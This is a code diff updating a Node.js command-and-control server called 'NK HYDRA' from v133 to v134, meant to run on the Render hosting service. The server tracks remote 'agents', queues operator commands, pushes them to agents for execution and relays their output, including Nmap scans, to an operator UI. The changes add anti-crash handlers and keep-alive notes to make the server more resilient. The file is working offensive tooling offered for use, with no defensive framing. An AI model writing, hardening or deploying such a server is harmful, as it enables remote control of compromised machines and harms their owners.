@@ -1,14 +1,15 @@
 // TYPE: NODE.JS C2 SERVER (RUN ON RENDER)
-// NK HYDRA v133.0 [STABLE QUEUE + SINGULARITY SUPPORT]
+// NK HYDRA v134.0 [STABLE QUEUE + SINGULARITY SUPPORT + ANTI-CRASH]
 
 const express = require('express');
 const http = require('http');
 const { Server } = require('socket.io');
 const cors = require('cors');
 
-// --- ANTI-CRASH HANDLERS ---
+// --- ANTI-CRASH HANDLERS (CRITICAL) ---
 process.on('uncaughtException', (err) => {
     console.error('CRITICAL: Uncaught Exception:', err);
+    // Do NOT exit process on Render
 });
 
 process.on('unhandledRejection', (reason, promise) => {
@@ -18,12 +19,12 @@ process.on('unhandledRejection', (reason, promise) => {
 const app = express();
 app.use(cors());
 
-// Health Check Endpoint
+// Health Check Endpoint for Ping Services (Keep Render Awake)
 app.get('/health', (req, res) => { res.status(200).send('OK'); });
 app.get('/', (req, res) => { 
     res.json({ 
         status: 'online', 
-        version: 'v133.0', 
+        version: 'v134.0', 
         agents: agents.length,
         queue: commandQueue.length
     }); 
@@ -34,7 +35,7 @@ const io = new Server(server, {
     cors: { origin: "*", methods: ["GET", "POST"] },
     pingInterval: 25000, 
     pingTimeout: 60000,
-    maxHttpBufferSize: 1e8, // 100MB Limit (Fix for Nmap/Large Logs)
+    maxHttpBufferSize: 1e8, // 100MB Limit (Prevents crash on large Nmap output)
     transports: ['polling', 'websocket'] 
 });
 
@@ -42,7 +43,7 @@ let agents = [];
 const commandQueue = [];
 let isProcessingQueue = false;
 
-// --- QUEUE PROCESSOR (STABLE) ---
+// --- QUEUE PROCESSOR ---
 const processQueue = async () => {
     if (isProcessingQueue || commandQueue.length === 0) return;
     isProcessingQueue = true;
@@ -56,12 +57,10 @@ const processQueue = async () => {
                 } else {
                     const agent = agents.find(a => a.id === task.targetId);
                     if (agent && agent.socketId) {
-                         // Wrap emit in try/catch to avoid crash if socket invalid
                          try {
                              io.to(agent.socketId).emit('exec_cmd', { cmd: task.cmd, id: task.id });
                          } catch (err) {
-                             console.error("Emit Failed:", err);
-                             // Optional: Re-queue or mark failed
+                             console.error("Socket Emit Failed (Agent likely disconnected):", err);
                          }
                     }
                 }
@@ -70,7 +69,7 @@ const processQueue = async () => {
             }
         }
         // Throttle to prevent flooding
-        await new Promise(r => setTimeout(r, 100)); 
+        await new Promise(r => setTimeout(r, 200)); 
     }
     isProcessingQueue = false;
 };
@@ -104,8 +103,8 @@ io.on('connection', (socket) => {
             io.to('ui_room').emit('agents_list', agents);
             console.log(`[+] Agent Online: ${data.id}`);
             
-            // Check for pending commands
-            if (commandQueue.length > 0) processQueue();
+            // Re-process queue if agents come online
+            if(commandQueue.length > 0) processQueue();
 
         } catch (e) {
             console.error("Identify Error:", e);
@@ -126,7 +125,6 @@ io.on('connection', (socket) => {
     
     socket.on('agent_event', (data) => {
         try {
-            // Forward everything to UI
             io.to('ui_room').emit('agent_event', data);
         } catch (e) { console.error("Relay Error:", e); }
     });
@@ -141,5 +139,4 @@ io.on('connection', (socket) => {
 });
 
 const PORT = process.env.PORT || 3000;
-server.listen(PORT, () => console.log(`HYDRA v133 LISTENING ON ${PORT}`));
-
+server.listen(PORT, () => console.log(`HYDRA v134 LISTENING ON ${PORT}`));
